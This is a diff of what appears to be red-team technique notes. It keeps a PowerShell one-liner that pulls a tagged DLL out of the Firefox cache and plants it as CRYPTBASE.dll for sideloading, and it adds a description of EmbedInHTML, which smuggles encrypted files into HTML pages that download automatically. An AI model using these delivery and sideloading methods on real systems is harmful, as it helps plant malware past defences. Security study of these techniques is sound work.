@@ -205,13 +205,20 @@ We can find those tags using powershell:
 foreach ($f in @("$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries\")){Get-ChildItem $f -Recurse|%{if(Select-String -Pattern "DLLHERE" -Path $_.FullName){copy $_.FullName $env:LOCALAPPDATA\Microsoft\OneDrive\CRYPTBASE.dll}}}
 ```
 
+
 ## File transfer using WireGuard
 
 `wush` [^wush] is a command line tool that lets you easily transfer files and open shells over a peer-to-peer WireGuard connection. It works both on Linux and Windows. Download the binaries or the source code from [github](https://github.com/coder/wush/releases).
 
 [^wush]: [Erik - Last Week in Security (LWiS) - 2024-09-03](../../Readwise/Articles/Erik%20-%20Last%20Week%20in%20Security%20(LWiS)%20-%202024-09-03.md#^edb065)
 
+## Automatic download using EmbedInHTML
 
+Related tool: [Redteamronin/EmbedInHTML](../../Readwise/Articles/httpsgithub.comredteamronin%20-%20RedteamroninEmbedInHTML.md)
+
+What this tool does is taking a file (*any type of file*), encrypt it, and embed it into an HTML file as ressource, along with an automatic download routine simulating a user clicking on the embedded ressource.
+
+Then, when the user browses the HTML file, the embedded file is decrypted on the fly, saved in a temporary folder, and the file is then presented to the user.
 
 ---
 
